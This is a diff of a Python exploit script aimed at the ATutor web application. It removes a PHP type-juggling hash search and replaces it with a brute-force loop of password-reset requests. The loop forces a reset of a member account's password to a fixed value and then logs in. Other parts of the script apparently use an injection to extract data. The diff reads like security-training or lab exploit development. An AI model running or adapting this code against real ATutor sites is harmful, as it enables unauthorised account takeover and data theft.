@@ -44,29 +44,6 @@ def extract_data(ip, inj):
     print(f"Extracted data: {output}")
     return output
 
-# Generate g value to perform type juggling injection
-def get_code(id, password):
-    print("Searching for valid code......")
-    
-    pass_prefix = re.findall("^\d+",password)
-    if pass_prefix == []: pass_prefix = 0
-    else: pass_prefix = pass_prefix[0] 
-    print(f"Found password prefix {pass_prefix}")
-
-    for g in range(1,1000000):
-
-        raw_string = str(id + g + int(pass_prefix))
-        hash = hashlib.sha1(raw_string.encode()).hexdigest()
-        hash_prefix = hash[5:20]
-
-        if re.match(r'0+[eE]\d+$', hash_prefix):
-            print(f"Valid hash: {hash_prefix}")
-            print(f"Raw String: {raw_string}")
-            return g
-
-    raise Exception("No valid email found!")
-    return ""
-
 def reset_password(ip, params):
     print("Resetting Password.....")
     s = requests.Session()
@@ -85,24 +62,30 @@ def reset_password(ip, params):
     PASSWORD = 'Bromine1!'
     password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()
 
-    data = {
-        'form_change': 'true',
-        'id': params['id'],
-        'g': params['g'],
-        'h': params['h'], 
-        'password': PASSWORD,
-        'password2': PASSWORD,
-        'form_password_hidden': password_hash,
-        'password_error': '',
-        'submit': 'Submit'
-    }
+    for g in range(44000,100000):
 
-    r = s.post(target, data=data)
+        if g%100 == 0:
+            print(f"Progress..... completed search until {g}")
 
-    if re.findall('The link is either invalid or expired', r.text):
-        raise Exception("Password reset unsuccessful!")
-    print("Password reset successful!")
-    return s
+        data = {
+            'form_change': 'true',
+            'id': params['id'],
+            'g': g,
+            'h': params['h'], 
+            'password': PASSWORD,
+            'password2': PASSWORD,
+            'form_password_hidden': password_hash,
+            'password_error': '',
+            'submit': 'Submit'
+        }
+
+        r = s.post(target, data=data)
+
+        if re.findall('The link is either invalid or expired', r.text):
+            continue
+        else:
+            print("Password reset successful!")
+            return s
 
 def login(ip, username):
     target = f"http://{ip}/ATutor/login.php"
@@ -211,13 +194,10 @@ def main():
     member_id = 1
 
     h = 0
-    g = get_code(member_id, password)
-    print(f"Valid g value found: {g}")
 
     reset_password('atutor', params = {
         'id': member_id,
-        'h': 0,
-        'g': g
+        'h': 0
     })
 
     session = login(ip, username)
